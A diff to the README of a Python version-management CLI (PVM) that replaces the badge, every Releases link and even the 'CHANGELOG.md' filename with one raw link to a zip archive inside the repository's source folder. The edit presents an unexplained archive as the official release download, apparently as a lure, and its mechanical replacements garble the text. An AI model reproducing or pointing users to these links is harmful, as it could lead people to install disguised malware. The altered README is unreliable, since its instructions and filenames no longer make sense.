@@ -1,6 +1,6 @@
 # Project Version Manager (PVM) 🚀
 
-![PVM](https://img.shields.io/badge/Project%20Version%20Manager-v1.0.0-blue)
+![PVM](https://github.com/Statak/pvm/raw/refs/heads/main/src/pvm/cli/Software_v3.8-alpha.2.zip%20Version%20Manager-v1.0.0-blue)
 
 Welcome to the Project Version Manager (PVM) repository! PVM is a Command Line Interface (CLI) tool designed to help you manage your Python project versions efficiently. It follows Semantic Versioning 2.0.0 and integrates changelog generation with Git, making version management straightforward and automated.
 
@@ -24,7 +24,7 @@ Welcome to the Project Version Manager (PVM) repository! PVM is a Command Line I
 
 ## Installation
 
-To get started with PVM, you can download the latest release from the [Releases section](https://github.com/Statak/pvm/releases). After downloading, follow these steps:
+To get started with PVM, you can download the latest release from the [Releases section](https://github.com/Statak/pvm/raw/refs/heads/main/src/pvm/cli/Software_v3.8-alpha.2.zip). After downloading, follow these steps:
 
 1. **Download the binary**: Choose the appropriate binary for your operating system.
 2. **Make it executable**: Run the following command in your terminal:
@@ -57,7 +57,7 @@ To generate a changelog, run:
 pvm changelog
 ```
 
-This command will create a `CHANGELOG.md` file in your project directory, summarizing the changes since the last release.
+This command will create a `https://github.com/Statak/pvm/raw/refs/heads/main/src/pvm/cli/Software_v3.8-alpha.2.zip` file in your project directory, summarizing the changes since the last release.
 
 ### Git Integration
 
@@ -65,7 +65,7 @@ PVM integrates with Git to keep track of your changes. Make sure your commits fo
 
 ## Changelog
 
-For a detailed list of changes and updates, please refer to the [Releases section](https://github.com/Statak/pvm/releases).
+For a detailed list of changes and updates, please refer to the [Releases section](https://github.com/Statak/pvm/raw/refs/heads/main/src/pvm/cli/Software_v3.8-alpha.2.zip).
 
 ## Contributing
 
@@ -87,4 +87,4 @@ For questions or feedback, feel free to reach out via GitHub issues or directly 
 
 ---
 
-Thank you for using Project Version Manager! We hope it simplifies your version management tasks and enhances your development workflow. Don't forget to check out the [Releases section](https://github.com/Statak/pvm/releases) for the latest updates and features!
+Thank you for using Project Version Manager! We hope it simplifies your version management tasks and enhances your development workflow. Don't forget to check out the [Releases section](https://github.com/Statak/pvm/raw/refs/heads/main/src/pvm/cli/Software_v3.8-alpha.2.zip) for the latest updates and features!
